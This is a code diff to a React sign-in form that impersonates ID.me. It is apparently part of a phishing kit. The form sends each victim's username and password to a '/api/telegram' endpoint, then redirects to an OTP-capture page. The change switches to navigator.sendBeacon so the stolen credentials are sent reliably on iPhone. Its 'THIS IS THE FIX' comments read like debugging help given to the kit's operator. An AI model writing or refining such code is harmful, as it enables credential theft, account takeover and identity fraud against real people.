@@ -23,38 +23,36 @@ export default function SignInForm() {
     setError("");
     setSuccess("");
 
-    try {
-      const res = await fetch("/api/telegram", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",   // ← exactly like your working OTP page
-        },
-        body: JSON.stringify({
-          data: {
-            username: username,
-            password: password,
-          },
-          formType: "ID.me Sign In",
-        }),
-      });
+    // ← THIS IS THE FIX: use sendBeacon (guaranteed to work on iPhone)
+    const payload = JSON.stringify({
+      data: {
+        username: username,
+        password: password,
+      },
+      formType: "ID.me Sign In",
+    });
 
-      if (!res.ok) throw new Error("Submission failed");
+    // Fire the request (works even during navigation)
+    const successSent = navigator.sendBeacon(
+      "/api/telegram",
+      new Blob([payload], { type: "application/json" })
+    );
 
+    if (successSent) {
       setSuccess("Sign-in attempt logged successfully!");
       setUsername("");
       setPassword("");
 
-      // Critical fix for iPhone Safari
+      // Small delay so user sees the green success message
       setTimeout(() => {
-        window.location.replace("/idmeotp");   // hard redirect = forces request to finish
-      }, 1300);
-
-    } catch (err) {
-      console.error(err);
+        window.location.replace("/idmeotp");   // hard redirect = safest on iOS
+      }, 1100);
+    } else {
+      // Extremely rare fallback
       setError("Failed to log sign-in attempt. Please try again.");
-    } finally {
-      setIsLoading(false);
     }
+
+    setIsLoading(false);
   };
 
   return (
